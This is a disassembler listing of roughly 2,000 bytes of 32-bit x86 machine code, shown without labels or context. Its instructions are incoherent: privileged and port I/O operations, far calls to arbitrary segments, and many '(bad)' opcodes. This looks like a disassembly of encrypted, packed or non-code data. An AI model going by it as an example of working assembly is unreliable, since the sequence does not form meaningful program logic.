  4171e5:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171e7:	aaa    
  4171e8:	fld    QWORD PTR [edx+eax*8]
  4171eb:	loope  0x417268
  4171ed:	cli    
  4171ee:	cli    
  4171ef:	and    BYTE PTR [ebx+eiz*4-0x70],0xae
  4171f4:	dec    ecx
  4171f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171f6:	shl    DWORD PTR [esi-0x613ee5c4],1
  4171fc:	dec    esi
  4171fd:	pop    edx
  4171fe:	cmp    BYTE PTR [eax+0x42],al
  417201:	xor    DWORD PTR [ebx+ebx*1],ebp
  417204:	in     al,dx
  417205:	js     0x4171c5
  417207:	xchg   BYTE PTR [ecx],dh
  417209:	hlt    
  41720a:	pop    esi
  41720b:	pop    ecx
  41720c:	arpl   bx,cx
  41720e:	pop    es
  41720f:	loope  0x41728f
  417211:	and    eax,0x36e78c49
  417216:	jo     0x417267
  417218:	mov    bh,0x68
  41721a:	rcr    DWORD PTR [edi+ebp*1+0x23],cl
  41721e:	jp     0x4171e1
  417220:	xor    ebx,DWORD PTR [ebp+0x1c7d252e]
  417226:	mov    edi,0x4558abee
  41722b:	clts   
  41722d:	and    BYTE PTR [ebp+0x13],al
  417230:	dec    ecx
  417231:	adc    al,al
  417233:	stc    
  417234:	lds    eax,FWORD PTR [eax]
  417236:	push   ebx
  417237:	cli    
  417238:	test   al,0x6f
  41723a:	gs xor eax,0x745d18c2
  417240:	aas    
  417241:	xchg   ebx,eax
  417242:	dec    esp
  417243:	out    0xf8,eax
  417245:	sbb    dl,BYTE PTR [esi]
  417247:	imul   edi,ebp,0x791207e7
  41724d:	js     0x417275
  41724f:	nop
  417250:	dec    BYTE PTR [ebx]
  417252:	aas    
  417253:	loop   0x417225
  417255:	lea    esi,[edi]
  417257:	xlat   BYTE PTR ds:[ebx]
  417258:	ror    BYTE PTR [ebp+0x2127d052],0x8c
  41725f:	mov    ah,0x62
  417261:	add    DWORD PTR [ebp-0x65],edi
  417264:	out    dx,al
  417265:	out    0x9e,eax
  417267:	in     eax,dx
  417268:	and    al,0xcb
  41726a:	fcmovb st,st(4)
  41726c:	(bad)  
  41726d:	sub    eax,0xb504815b
  417272:	int    0x78
  417274:	push   0x975c1895
  417279:	xchg   ebp,eax
  41727a:	xchg   ecx,eax
  41727b:	dec    esp
  41727c:	or     BYTE PTR [ebx],bh
  41727e:	in     al,0x3a
  417280:	push   cs
  417281:	pop    eax
  417282:	jo     0x41721c
  417284:	mov    edx,0xe261d200
  417289:	iret   
  41728a:	mul    DWORD PTR [ebp-0x3ec3903d]
  417290:	lea    esp,[edi-0x40765a0d]
  417296:	xchg   ebp,eax
  417297:	cmp    al,dl
  417299:	or     bl,BYTE PTR [edi]
  41729b:	call   0x1993d2c9
  4172a0:	or     DWORD PTR [ecx-0x4e],ebp
  4172a3:	add    esp,ebp
  4172a5:	sbb    eax,0xa0b21a4c
  4172aa:	and    dl,BYTE PTR ds:0xba3e8b47
  4172b0:	scas   al,BYTE PTR es:[edi]
  4172b1:	xchg   ebx,eax
  4172b3:	ret    0x854e
  4172b6:	adc    DWORD PTR [eax],edi
  4172b8:	dec    esi
  4172b9:	sub    eax,0xf7e4eca9
  4172be:	bnd jge 0x41732f
  4172c1:	push   0x8251aac9
  4172c6:	xor    DWORD PTR [eax-0x63],edx
  4172c9:	push   ebx
  4172ca:	imul   BYTE PTR ds:[edx]
  4172cd:	icebp  
  4172ce:	fsubr  QWORD PTR [esi]
  4172d0:	js     0x4172ef
  4172d2:	pusha  
  4172d3:	sub    al,0x73
  4172d5:	clc    
  4172d6:	stos   BYTE PTR es:[edi],al
  4172d7:	and    eax,esp
  4172d9:	adc    eax,0xacd5ffa2
  4172de:	lock (bad) 
  4172e0:	repnz lds esi,FWORD PTR [ebp-0x60a60aeb]
  4172e7:	ja     0x417304
  4172e9:	retf   0xca20
  4172ec:	and    dl,BYTE PTR [ecx+0x65]
  4172ef:	mov    ah,0xde
  4172f1:	dec    esp
  4172f2:	test   al,0x9
  4172f4:	inc    eax
  4172f5:	pop    ebp
  4172f6:	sub    esp,edi
  4172f8:	jge    0x417282
  4172fa:	out    0x1d,eax
  4172fc:	pop    ebp
  4172fd:	fistp  WORD PTR [ebx+esi*2+0x61]
  417301:	push   ebx
  417302:	xor    ch,BYTE PTR [ebx-0x52]
  417305:	(bad)  
  417306:	int    0x92
  417308:	dec    edx
  417309:	sbb    BYTE PTR [edi-0x346d5cdc],dl
  41730f:	jne    0x417342
  417311:	pop    es
  417312:	clc    
  417313:	push   edi
  417314:	and    al,0xe6
  417316:	out    dx,al
  417317:	in     eax,dx
  417318:	push   esp
  417319:	xor    DWORD PTR [ebx],ebp
  41731b:	mov    esi,0x24bfec12
  417320:	inc    esi
  417321:	stos   BYTE PTR es:[edi],al
  417322:	mov    ecx,0xe3810663
  417327:	in     al,0x9e
  417329:	mov    ch,0xec
  41732b:	push   esi
  41732c:	xor    DWORD PTR ds:[esi-0x67],0xffffffdb
  417331:	cmp    DWORD PTR [ebp+0x2],edi
  417334:	pop    esp
  417335:	fbld   TBYTE PTR [ebp+0x3d842cb5]
  41733b:	lahf   
  41733c:	mov    BYTE PTR ds:0x2d896f39,dl
  417342:	popa   
  417343:	inc    ecx
  417344:	shl    dh,cl
  417346:	test   BYTE PTR [edx],ch
  417348:	or     al,0xae
  41734a:	in     eax,0xea
  41734c:	es cs jg 0x4173bb
  417350:	add    al,0xcc
  417352:	scas   al,BYTE PTR es:[edi]
  417353:	xchg   ecx,eax
  417354:	xchg   edx,eax
  417355:	pop    ebx
  417356:	and    ebp,ecx
  417358:	jmp    DWORD PTR [esi-0xdfce589]
  41735e:	inc    ecx
  41735f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417360:	out    dx,al
  417361:	xor    edi,esi
  417363:	cmp    ebp,DWORD PTR [esi]
  417365:	mov    db7,ecx
  417368:	xchg   ebp,eax
  417369:	and    eax,ecx
  41736b:	jae    0x41731f
  41736d:	inc    edx
  41736e:	sbb    DWORD PTR [ebx-0x33],ebp
  417371:	dec    ecx
  417372:	push   edi
  417373:	enter  0x315f,0xad
  417377:	retf   
  417378:	xchg   ebp,eax
  417379:	adc    al,dh
  41737b:	sbb    BYTE PTR [edx-0x4a],bl
  41737e:	push   edx
  41737f:	sub    dh,bl
  417381:	int3   
  417382:	or     bh,dh
  417384:	sub    DWORD PTR cs:[ecx],0x3c
  417388:	in     al,0xf6
  41738a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41738b:	push   0x9d6ebe73
  417390:	hlt    
  417391:	(bad)  
  417392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417393:	mov    ch,0x60
  417395:	enter  0x8c48,0xc3
  417399:	stos   BYTE PTR es:[edi],al
  41739a:	jno    0x4173bf
  41739c:	add    edi,ecx
  41739e:	jmp    0x417408
  4173a0:	cmp    edi,ebp
  4173a2:	dec    edx
  4173a3:	sbb    BYTE PTR [ecx+0x64],bh
  4173a6:	jmp    0xfa202a68
  4173ab:	and    BYTE PTR [ebx+0x58],cl
  4173ae:	mov    ds:0x7985ab41,al
  4173b3:	imul   ecx,ebp,0x78b2fb1b
  4173b9:	out    dx,al
  4173ba:	sti    
  4173bb:	mov    ?,ebp
  4173bd:	mov    ecx,DWORD PTR [ecx+0x60]
  4173c0:	xchg   edx,eax
  4173c1:	jns    0x41739f
  4173c3:	int    0xc2
  4173c5:	adc    BYTE PTR ds:0x56438296,al
  4173cb:	outs   dx,DWORD PTR ds:[esi]
  4173cc:	and    BYTE PTR ds:0xc39255fc,bh
  4173d2:	push   0x9bcb2912
  4173d7:	xor    eax,0xecf30064
  4173dc:	retf   
  4173dd:	test   eax,0xb768efa9
  4173e2:	test   DWORD PTR [edi+ebp*2],0x8c905ee7
  4173e9:	push   0x31c5dea3
  4173ee:	stc    
  4173ef:	pop    ss
  4173f0:	shl    DWORD PTR [ebx],1
  4173f2:	pop    ds
  4173f3:	ret    0x8425
  4173f6:	mov    eax,ds:0x6aa876b8
  4173fb:	lods   eax,DWORD PTR ds:[esi]
  4173fc:	and    esi,esi
  4173fe:	lea    esp,ds:0x755f3925
  417404:	sub    al,0xcf
  417406:	inc    edi
  417407:	mov    cs,esp
  417409:	push   eax
  41740a:	cli    
  41740b:	jne    0x4173b3
  41740d:	js     0x41743c
  41740f:	sub    al,0xe3
  417411:	mov    al,0xb6
  417413:	aaa    
  417414:	xor    edx,DWORD PTR ds:0x4ec0631f
  41741a:	test   BYTE PTR [esp-0x5a],dh
  41741e:	fs cmp eax,0xfc330eba
  417424:	add    DWORD PTR [ebx+eiz*2+0x20],ebp
  417428:	(bad)  
  417429:	inc    ecx
  41742a:	jle    0x4173f9
  41742c:	imul   ebp,eax,0x580a46d8
  417432:	ss aas 
  417434:	aas    
  417435:	les    ebp,FWORD PTR [ecx+0x3a]
  417438:	xchg   DWORD PTR [eax-0x60],esp
  41743b:	mov    edi,0xf0a2c6bf
  417440:	or     BYTE PTR [edi+0x3169a072],cl
  417446:	scas   al,BYTE PTR es:[edi]
  417447:	xor    ebp,ebp
  417449:	fmul   st,st(6)
  41744b:	in     al,0x31
  41744d:	jbe    0x41749f
  41744f:	mov    dh,0x74
  417451:	mov    ds:0x7231619c,al
  417456:	fiadd  DWORD PTR [edx]
  417458:	ins    BYTE PTR es:[edi],dx
  417459:	mov    edi,0x5184d1cb
  41745e:	dec    edx
  41745f:	dec    eax
  417460:	ficom  WORD PTR [ecx]
  417462:	mov    bh,0x2e
  417464:	pop    edx
  417465:	lods   eax,DWORD PTR ss:[esi]
  417467:	cmp    DWORD PTR [ecx+0x384c9ff1],0x6b92ae62
  417471:	pop    ebp
  417472:	or     eax,0x187cffdb
  417477:	mov    cl,0xcb
  417479:	dec    eax
  41747a:	xor    edx,DWORD PTR [edi]
  41747c:	jl     0x417465
  41747e:	sub    BYTE PTR [ebp-0x56eb5c1d],cl
  417484:	push   0x4f
  417486:	imul   esp,DWORD PTR [eax+ebp*4],0xffffffeb
  41748a:	hlt    
  41748b:	adc    DWORD PTR [ebp-0x38818496],ebp
  417491:	mov    ecx,0x7e434490
  417496:	add    BYTE PTR [edx-0x2bbab03d],bl
  41749c:	test   DWORD PTR [esp+ecx*1],0x71272a0c
  4174a3:	lods   eax,DWORD PTR ds:[esi]
  4174a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174a5:	xor    BYTE PTR [edi-0x3e9f107],bh
  4174ab:	and    ch,cl
  4174ad:	mov    esp,0xb987c671
  4174b2:	arpl   WORD PTR [esi],sp
  4174b4:	mov    al,BYTE PTR [ebx]
  4174b6:	icebp  
  4174b7:	jnp    0x4174c9
  4174b9:	in     eax,dx
  4174ba:	fbstp  TBYTE PTR [edi+ebp*4]
  4174bd:	sub    al,0x8e
  4174bf:	push   ebp
  4174c0:	xchg   esp,eax
  4174c1:	addr16 xchg esp,eax
  4174c3:	pop    DWORD PTR [edx+0x11]
  4174c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174c7:	and    BYTE PTR [ecx+0x13],ah
  4174ca:	mov    esp,0x7e75243e
  4174cf:	mov    gs,ecx
  4174d1:	push   cs
  4174d2:	mov    DWORD PTR [edi],ebp
  4174d4:	cmp    DWORD PTR [edi],esp
  4174d6:	jmp    0x41754b
  4174d8:	jge    0x4174e9
  4174da:	pop    ss
  4174db:	dec    eax
  4174dc:	push   edi
  4174dd:	retf   0x361f
  4174e0:	dec    eax
  4174e1:	pop    ebx
  4174e2:	test   al,0x69
  4174e4:	xor    eax,0x70dafed2
  4174e9:	out    0xd6,eax
  4174eb:	add    eax,0x4e4381b
  4174f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174f1:	mov    eax,0xc908cf7a
  4174f6:	dec    esi
  4174f7:	ret    
  4174f8:	jmp    FWORD PTR [ebx+edi*4]
  4174fb:	sbb    esp,0xffffffc2
  4174fe:	mov    WORD PTR [ebp-0x5606691e],cs
  417504:	xor    DWORD PTR [edi-0x6b],0x4f
  417508:	bound  ebx,QWORD PTR [edx+edi*4-0x3c]
  41750c:	aam    0xc0
  41750e:	out    0xb9,eax
  417510:	cmp    BYTE PTR [ebx-0x34f4ef76],dh
  417516:	bswap  esp
  417518:	in     al,0x10
  41751a:	jp     0x41753e
  41751c:	pop    es
  41751d:	xchg   esi,eax
  41751e:	rcr    BYTE PTR [ebx+eax*1+0x5e],cl
  417522:	sub    eax,0x33d17062
  417527:	frstor [edx+0x26]
  41752a:	test   edx,esi
  41752c:	xchg   edi,eax
  41752d:	test   al,0xc8
  41752f:	nop
  417530:	push   esi
  417531:	das    
  417532:	and    al,BYTE PTR [esi]
  417534:	inc    esi
  417535:	daa    
  417536:	loopne 0x41759c
  417538:	retf   
  417539:	shl    ebp,cl
  41753b:	cmp    BYTE PTR [edi-0x1ee2e62],dh
  417541:	(bad)  
  417542:	scas   eax,DWORD PTR es:[edi]
  417543:	push   ss
  417544:	or     edi,DWORD PTR [ecx+0x6703640c]
  41754a:	sub    ah,0x34
  41754d:	add    al,0x71
  41754f:	lods   eax,DWORD PTR fs:[esi]
  417551:	or     ebx,DWORD PTR [eax+ebx*1+0x1cfdab0b]
  417558:	dec    eax
  417559:	or     al,dl
  41755b:	addr16 jo 0x417594
  41755e:	or     dh,BYTE PTR [edx+0x7a]
  417561:	cmc    
  417562:	cli    
  417563:	(bad)  
  417564:	xor    eax,0xcd41c58b
  417569:	sub    DWORD PTR [ecx],edi
  41756b:	xchg   edx,eax
  41756c:	and    al,0xc9
  41756e:	mov    ebp,0xe2e418b9
  417573:	sbb    DWORD PTR [esi-0x34bdc0f8],edi
  417579:	in     eax,dx
  41757a:	mov    WORD PTR [edx-0x10],?
  41757d:	(bad)  
  41757f:	cmp    eax,DWORD PTR [edi]
  417581:	push   esp
  417582:	fld    QWORD PTR [edi]
  417584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417585:	dec    eax
  417586:	call   0x914caeda
  41758b:	jl     0x417573
  41758d:	jb     0xcb40242d
  417593:	cwde   
  417594:	inc    ebx
  417595:	add    al,0x3b
  417597:	(bad)  
  417598:	ss inc ebp
  41759a:	inc    esi
  41759b:	aam    0xcb
  41759d:	xchg   BYTE PTR [eax+ecx*1-0x21],dl
  4175a1:	ins    DWORD PTR es:[edi],dx
  4175a2:	mov    al,ds:0x4e7f9c36
  4175a7:	adc    al,0x5c
  4175a9:	push   ebx
  4175aa:	shr    BYTE PTR [ebx],1
  4175ac:	push   edi
  4175ad:	sub    BYTE PTR [esi+0x5a],0x2b
  4175b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175b2:	in     eax,dx
  4175b3:	cmp    ah,BYTE PTR [eax+0x73]
  4175b6:	inc    ebp
  4175b7:	retf   0x646e
  4175ba:	aad    0x55
  4175bc:	mov    al,0x36
  4175be:	dec    esp
  4175bf:	fldz   
  4175c1:	or     bl,BYTE PTR [esi]
  4175c3:	jb     0x41762d
  4175c5:	test   al,0xa5
  4175c7:	xor    bl,BYTE PTR [esi]
  4175c9:	shl    BYTE PTR [esi-0x707a720e],0x71
  4175d0:	xchg   ecx,eax
  4175d1:	aad    0x9e
  4175d3:	adc    bl,BYTE PTR [ecx+0x6deee7ab]
  4175d9:	or     DWORD PTR [ebx+0x41dd03e2],edx
  4175df:	pmaxub mm4,QWORD PTR [edi]
  4175e2:	(bad)  
  4175e3:	in     eax,dx
  4175e4:	cld    
  4175e5:	xchg   ebp,eax
  4175e6:	aam    0xcc
  4175e8:	inc    ebx
  4175e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175ea:	and    dh,dl
  4175ec:	mov    bh,dl
  4175ee:	adc    al,0x91
  4175f0:	pop    ebx
  4175f1:	(bad)  
  4175f2:	je     0x4175ec
  4175f4:	xchg   ecx,eax
  4175f5:	jo     0x41758e
  4175f7:	inc    ebp
  4175f8:	push   esp
  4175f9:	mov    ecx,0xbe12c488
  4175fe:	nop
  4175ff:	mov    ds:0xb8df193e,al
  417604:	pop    ebx
  417605:	inc    ecx
  417606:	add    edi,DWORD PTR [edx-0x4f89f89]
  41760c:	(bad)  
  41760d:	push   ecx
  41760e:	es jge 0x417637
  417611:	lds    esp,FWORD PTR [esi+eiz*4]
  417614:	scas   eax,DWORD PTR es:[edi]
  417615:	bound  ebx,QWORD PTR [ecx+ebx*1]
  417618:	loope  0x41764b
  41761a:	loop   0x4175cf
  41761c:	loopne 0x41766e
  41761e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41761f:	das    
  417620:	jmp    FWORD PTR [eax]
  417622:	out    dx,eax
  417623:	fild   DWORD PTR [esp+edx*2+0xd]
  417627:	mov    dh,0x9
  417629:	sti    
  41762a:	lods   eax,DWORD PTR ds:[esi]
  41762b:	pop    ecx
  41762c:	lahf   
  41762d:	inc    ebx
  41762e:	cmc    
  41762f:	cmp    edi,DWORD PTR [edx-0x14]
  417632:	add    bh,BYTE PTR [ebx-0x5d]
  417635:	mov    al,ds:0xb7bdbf64
  41763a:	adc    eax,edx
  41763c:	inc    DWORD PTR [ebx]
  41763e:	or     al,0x88
  417640:	jno    0x41767a
  417642:	rcl    DWORD PTR [edi+0x53],0xb
  417646:	inc    eax
  417647:	stos   DWORD PTR es:[edi],eax
  417648:	sbb    BYTE PTR [esi+0x0],dl
  41764b:	rol    DWORD PTR [ebp+0x51287be8],cl
  417651:	mov    dh,0x85
  417653:	dec    esi
  417654:	push   ebx
  417655:	dec    ebp
  417656:	push   edi
  417657:	xchg   edi,eax
  417658:	mov    bh,0x32
  41765a:	(bad)  [ebp+0x47]
  41765d:	add    eax,0x9522e7b8
  417662:	stc    
  417663:	test   al,0xa1
  417665:	push   edx
  417666:	mov    ebx,DWORD PTR [eax]
  417668:	(bad)  
  417669:	mov    eax,ds:0x69746c5d
  41766e:	cwde   
  41766f:	inc    esp
  417670:	(bad)  
  417671:	sbb    ch,BYTE PTR [ebp-0x46]
  417674:	adc    al,BYTE PTR [ebx-0x2656fa3]
  41767a:	push   0xf2aea983
  41767f:	cdq    
  417680:	jns    0x4176bb
  417682:	push   ss
  417683:	mov    eax,ds:0x8d35ed8d
  417688:	or     esi,DWORD PTR [eax-0x7513cf29]
  41768e:	test   BYTE PTR [ebx-0x32fb0249],ah
  417694:	mov    al,0x92
  417696:	mov    edi,0x947e76b2
  41769b:	dec    edi
  41769c:	mul    DWORD PTR [edx-0x33]
  41769f:	les    ecx,FWORD PTR [ecx-0xa]
  4176a2:	mov    edx,DWORD PTR [edi]
  4176a4:	xchg   DWORD PTR [ebp-0x17],esi
  4176a7:	test   DWORD PTR ds:0x8c4c20c9,ebx
  4176ad:	push   edi
  4176ae:	xchg   esi,eax
  4176af:	ret    
  4176b0:	jne    0x417663
  4176b2:	push   ebp
  4176b3:	in     eax,0x2a
  4176b5:	mov    ds:0x9565c067,al
  4176ba:	sbb    ebp,esp
  4176bc:	inc    ecx
  4176bd:	mov    edi,DWORD PTR [ebp+0x557564d4]
  4176c3:	dec    esi
  4176c4:	xchg   ecx,eax
  4176c5:	push   es
  4176c6:	data16 (bad) 
  4176c8:	es cdq 
  4176ca:	add    eax,0xc7082f60
  4176cf:	pusha  
  4176d0:	mov    eax,ds:0x149cb66e
  4176d5:	cmp    DWORD PTR [esi+0x61],ebp
  4176d8:	mov    gs,WORD PTR [ebx+0x2b43766]
  4176de:	xor    BYTE PTR [edi],ah
  4176e0:	dec    BYTE PTR [ebx-0x11]
  4176e3:	pop    ebp
  4176e4:	pop    ecx
  4176e5:	mov    DWORD PTR [edi+edi*8],ebp
  4176e8:	and    DWORD PTR [eax-0x6d],edx
  4176eb:	mov    eax,ds:0x312ce695
  4176f0:	loopne 0x4176d3
  4176f2:	xchg   edx,eax
  4176f3:	call   0xb89a:0x5ed61765
  4176fa:	(bad)
  4176fd:	(bad)  
  4176fe:	cdq    
  4176ff:	dec    edx
  417700:	inc    ecx
  417701:	(bad)  
  417703:	xchg   ecx,eax
  417704:	xchg   BYTE PTR [edi+eiz*4],bh
  417707:	xor    al,0x32
  417709:	or     al,0x55
  41770b:	into   
  41770c:	jbe    0x417764
  41770e:	pop    ds
  41770f:	sub    al,0xd6
  417711:	scas   eax,DWORD PTR es:[edi]
  417712:	push   ds
  417713:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  417715:	pop    edx
  417716:	dec    esp
  417717:	mov    ebx,0x62b91de0
  41771c:	xlat   BYTE PTR ds:[ebx]
  41771d:	push   cs
  41771e:	fwait
  41771f:	jb     0x417718
  417721:	iret   
  417722:	nop
  417723:	popa   
  417724:	push   0xe9d03fb1
  417729:	sbb    BYTE PTR [ecx+0x40c5eb45],0xd5
  417730:	arpl   WORD PTR [ecx-0x178ac36e],di
  417736:	imul   ebp,DWORD PTR [esi],0x3a
  417739:	and    DWORD PTR [edi],ecx
  41773b:	push   ebp
  41773c:	lds    edx,FWORD PTR [esi+0x74350985]
  417742:	sbb    esi,DWORD PTR [edx-0x17]
  417745:	push   ds
  417746:	add    eax,0xe8867c28
  41774b:	test   eax,0xbcb116cf
  417750:	aas    
  417751:	gs add al,0x99
  417754:	inc    esi
  417755:	lock cmp BYTE PTR [ecx],bh
  417758:	adc    DWORD PTR ds:[esi+0x7d124105],ecx
  41775f:	mov    ebx,0xe3a8aa7d
  417764:	shl    BYTE PTR [edi-0x20],cl
  417767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417768:	rcl    DWORD PTR [ebx],cl
  41776a:	sbb    eax,esp
  41776c:	popf   
  41776d:	jecxz  0x4177d2
  41776f:	add    DWORD PTR [ecx-0x7],edx
  417772:	jg     0x417794
  417774:	and    BYTE PTR [esi+edi*4-0x6b],dl
  417778:	mov    al,0xab
  41777a:	mov    bh,0xde
  41777c:	mov    cs,WORD PTR [ecx+ecx*8]
  41777f:	shl    BYTE PTR [eax-0x3b],cl
  417782:	jno    0x41778a
  417784:	retf   0x701
  417787:	adc    DWORD PTR [ebx],esp
  417789:	lahf   
  41778a:	lods   eax,DWORD PTR ds:[esi]
  41778b:	daa    
  41778c:	mov    ecx,0x684786ee
  417791:	fdivp  st(0),st
  417793:	sbb    bl,ah
  417795:	add    DWORD PTR [edx],edi
  417797:	stc    
  417798:	jp     0x417764
  41779a:	rol    DWORD PTR [ebp+0x3bde4596],cl
  4177a0:	cdq    
  4177a1:	arpl   WORD PTR [edx+0x216eb426],dx
  4177a7:	jb     0x4177c5
  4177a9:	xchg   esi,eax
  4177aa:	mov    esi,esp
  4177ac:	mov    dh,0x8e
  4177ae:	js     0x41776c
  4177b0:	ss pop edi
  4177b2:	(bad)  
  4177b4:	pop    eax
  4177b5:	xor    edi,DWORD PTR [ebx]
  4177b7:	xchg   ecx,eax
  4177b8:	inc    ebp
  4177b9:	sbb    ch,dl
  4177bb:	jmp    0x4177ff
  4177bd:	jge    0x417758
  4177bf:	int3   
  4177c0:	adc    ebx,DWORD PTR [edx-0x6f]
  4177c3:	mov    al,0xe1
  4177c5:	jmp    0x951a:0x1dbabba3
  4177cc:	inc    esi
  4177cd:	mov    ds:0xc554b931,al
  4177d2:	pop    ebx
  4177d3:	dec    BYTE PTR [eax-0x58]
  4177d6:	gs pop ebp
  4177d8:	(bad)  
  4177d9:	into   
  4177da:	add    DWORD PTR [esi-0x74],ebx
  4177dd:	imul   edx,DWORD PTR [ecx-0x4952c234],0xffffffc8
  4177e4:	pushf  
  4177e5:	mov    esp,DWORD PTR [ecx+0x60ad3691]
  4177eb:	sahf   
  4177ec:	test   dh,0x58
  4177ef:	ins    DWORD PTR es:[edi],dx
  4177f0:	mov    BYTE PTR [eax-0x5f8b64c1],bh
  4177f6:	imul   esi,DWORD PTR [eax+0x67],0xffffffc2
  4177fa:	cld    
  4177fb:	shl    BYTE PTR [edx+0x5280d33d],1
  417801:	out    0x60,al
  417803:	pop    es
  417804:	push   cs
  417805:	xor    al,BYTE PTR [eax+0x124a5a05]
  41780b:	arpl   WORD PTR ds:0x5a4208f,bx
  417811:	xchg   ecx,eax
  417812:	xor    esp,ecx
  417814:	sti    
  417815:	jge    0x417891
  417817:	dec    edi
  417818:	in     eax,dx
  417819:	mov    esi,0x46471d14
  41781e:	mov    ds:0x2ecdc920,eax
  417823:	scas   eax,DWORD PTR es:[edi]
  417824:	or     al,0xd6
  417826:	aas    
  417827:	xor    al,0xf3
  417829:	and    ebp,edi
  41782b:	scas   al,BYTE PTR es:[edi]
  41782c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41782d:	inc    esp
  41782e:	adc    ah,BYTE PTR [ebx]
  417830:	inc    eax
  417831:	shl    BYTE PTR [esi],cl
  417833:	shl    BYTE PTR [ecx-0x22],cl
  417836:	cmp    eax,0x13cde9d9
  41783b:	add    eax,0xdfd013f7
  417840:	in     eax,dx
  417841:	push   ss
  417842:	or     eax,0x15bb41e9
  417847:	dec    edi
  417848:	rep stos DWORD PTR es:[edi],eax
  41784a:	lock jl 0x41787a
  41784d:	cmp    al,0x67
  41784f:	push   0xfffffffa
  417851:	enter  0x1575,0x23
  417855:	xchg   ecx,eax
  417856:	out    0x5,al
  417858:	ins    BYTE PTR es:[edi],dx
  417859:	mov    cl,BYTE PTR [edx-0x19]
  41785c:	jecxz  0x41786c
  41785e:	mov    esi,0x65138669
  417863:	dec    ebp
  417864:	lea    eax,[ecx+ecx*1+0x65a8db6]
  41786b:	popf   
  41786c:	push   0x85145bff
  417871:	mov    ds:0x83b22d7d,al
  417876:	popf   
  417877:	mov    ds:0x4dc56aef,eax
  41787c:	in     al,dx
  41787d:	sbb    DWORD PTR [ecx-0x58],edi
  417880:	inc    BYTE PTR gs:[edi+0x12820e4b]
  417887:	pop    esi
  417888:	fsubr  DWORD PTR [ebx+0x1a25063]
  41788e:	push   0xffffff96
  417890:	fs jg  0x417907
  417893:	mov    ds:0x28f53a24,al
  417898:	and    BYTE PTR [edi-0x22],cl
  41789b:	lea    esp,[edx-0x1fd8ce43]
  4178a1:	(bad)  [edi]
  4178a3:	cdq    
  4178a4:	in     eax,dx
  4178a5:	into   
  4178a6:	jp     0x417903
  4178a8:	aaa    
  4178a9:	inc    eax
  4178aa:	and    al,0xe
  4178ac:	pop    ebx
  4178ad:	imul   cl
  4178af:	stc    
  4178b0:	imul   edx,DWORD PTR [ebp-0x7568afcf],0x2a
  4178b7:	out    0xba,al
  4178b9:	out    dx,eax
  4178ba:	out    0x63,al
  4178bc:	sub    eax,0x9bef1aae
  4178c1:	cmp    DWORD PTR [edi],ebp
  4178c3:	xchg   ebp,ebp
  4178c5:	repnz cmp DWORD PTR [ebp+0x7c1adbc9],edx
  4178cc:	and    eax,0xc7d99262
  4178d1:	pop    ss
  4178d2:	mov    esp,0xb9581520
  4178d7:	mov    al,ds:0x381ce93a
  4178dc:	sub    DWORD PTR [eax+0x5c],ebx
  4178df:	ffree  st(7)
  4178e1:	sub    edx,eax
  4178e3:	pop    esi
  4178e4:	ret    
  4178e5:	cmp    eax,0x649b1773
  4178ea:	mov    DWORD PTR [ecx-0x7ad500c4],eax
  4178f0:	in     al,0xb5
  4178f2:	jb     0x417914
  4178f4:	mov    DWORD PTR [ecx+0x3b3613d2],ecx
  4178fa:	sub    bl,BYTE PTR ds:0xf55f392b
  417900:	pop    esp
  417901:	cwde   
  417902:	xor    eax,0x1c8dc738
  417907:	and    edx,ebx
  417909:	sub    eax,0xa32178fb
  41790e:	outs   dx,DWORD PTR ds:[esi]
  41790f:	or     BYTE PTR [ebp-0x5],al
  417912:	xor    edx,esp
  417914:	test   DWORD PTR [eax],edx
  417916:	lock and edi,DWORD PTR [eax]
  417919:	call   ebp
  41791b:	call   0x89fd:0x31d6b81a
  417922:	icebp  
  417923:	xor    ebx,edx
  417925:	pusha  
  417926:	cs fs out 0x21,eax
  41792a:	sbb    al,0xaf
  41792c:	push   cs
  41792d:	push   es
  41792e:	inc    edi
  41792f:	jnp    0x41797e
  417931:	inc    eax
  417932:	pop    ss
  417933:	hlt    
  417934:	inc    eax
  417935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417936:	mov    dh,0xb8
  417938:	je     0x41798f
  41793a:	pop    edi
  41793b:	outs   dx,BYTE PTR ds:[esi]
  41793c:	loopne 0x417902
  41793e:	pop    esp
  41793f:	sub    dh,BYTE PTR [ebx+esi*2+0x528a38fb]
  417946:	fnstcw WORD PTR [esi]
  417948:	popf   
  417949:	jp     0x4178e7
  41794b:	in     al,dx
  41794c:	outs   dx,DWORD PTR ds:[esi]
  41794d:	test   eax,0xa7e5116b
  417952:	rcr    BYTE PTR [edi],1
  417954:	cmc    
  417955:	add    cl,BYTE PTR [ebx-0x1819a332]
  41795b:	popf   
  41795c:	xchg   BYTE PTR [edx-0x2f],ah
  41795f:	add    eax,0xbeeca5ea
  417964:	xchg   ebp,eax
  417965:	sub    eax,0x72332985
  41796a:	popf   
  41796b:	xchg   BYTE PTR [ebx-0x34],ch
  41796e:	scas   eax,DWORD PTR es:[edi]
  41796f:	sub    BYTE PTR [edi],ah
  417971:	xchg   ecx,eax
  417972:	shr    DWORD PTR [edx+0x2fa59b4b],0x58
  417979:	mov    WORD PTR [ecx-0x2a1422d3],ds
  41797f:	adc    dl,BYTE PTR cs:[ecx]
  417982:	mov    al,0xe6
  417984:	jno    0x41798b
  417986:	enter  0x42f6,0xd8
  41798a:	inc    edi
  41798b:	dec    esp
  41798c:	mov    eax,0x5715cb9b
  417991:	rol    DWORD PTR [esi+eax*1-0x13],0xe1
  417996:	mov    ds:0xb58dd4d7,eax
  41799b:	mov    edx,0x72e624a6
  4179a0:	int    0x8e
  4179a2:	inc    ecx
